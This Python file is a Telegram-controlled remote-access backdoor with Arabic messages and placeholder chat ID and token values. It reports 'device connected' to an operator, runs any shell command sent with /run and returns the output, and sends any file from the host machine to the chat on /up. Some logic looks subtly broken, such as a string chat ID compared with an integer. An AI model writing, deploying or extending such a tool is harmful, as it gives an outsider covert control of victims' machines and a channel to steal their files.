import asyncio
import html
import os
# telegarm bot impoets
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from telegram.error import NetworkError

CHAT_ID = "__CHAT_ID__"
TOKEN = "__TOKEN__"


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    message = (
        "🟢 الجهاز يعمل بنجاح"
    )

    await update.message.reply_text(
        message,
        parse_mode="HTML"
    )

async def run_command(command: str) -> str:
    process = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )

    output, _ = await process.communicate()

    return output.decode("utf-8", errors="replace")

async def run_command_handler(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE
):
    if update.effective_chat.id != CHAT_ID:
        return

    if not context.args:
        await update.message.reply_text(
            "❌ الاستخدام:\n"
            "<code>/run command</code>",
            parse_mode="HTML"
        )
        return

    command = " ".join(context.args)

    try:
        result = await run_command(command)

        if not result:
            result = "(no output)"

        result = html.escape(result)

        await update.message.reply_text(
            "🖥️ <b>ناتج الامر</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"<pre>{result}</pre>",
            parse_mode="HTML"
        )

    except NetworkError as exc:
        print(f"[Telegram] Failed to send result: {exc}")

    except Exception as exc:
        print(
            f"[run] Handler error: "
            f"{type(exc).__name__}: {exc}"
        )



async def upload_command_handl(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_chat.id != CHAT_ID:
        return

    if not context.args:
        await update.message.reply_text(
            'الاستخدام:\n/upload "file_path"'
        )
        return

    file_path = " ".join(context.args).strip().strip('"').strip("'")

    if not os.path.isfile(file_path):
        await update.message.reply_text("❌ الملف غير موجود.")
        return

    try:
        with open(file_path, "rb") as file:
            await update.message.reply_document(
                document=file,
                caption="تم رفع الملف ✅"
            )

    except Exception as e:
        await update.message.reply_text(f"❌ حدث خطأ:\n{e}")

async def post_init(application):
    await application.bot.send_message(
        chat_id=CHAT_ID,
        text="🟢 الجهاز متصل"
    )

def main():
    application = (
        ApplicationBuilder()
        .token(TOKEN)
        .post_init(post_init)
        .build()
    )

    start_handler = CommandHandler('start', start)
    application.add_handler(start_handler)

    application.add_handler(CommandHandler('run', run_command_handler))
    application.add_handler(
        CommandHandler("up", upload_command_handl)
    )
    application.run_polling()



if __name__ == '__main__':
    asyncio.run(main())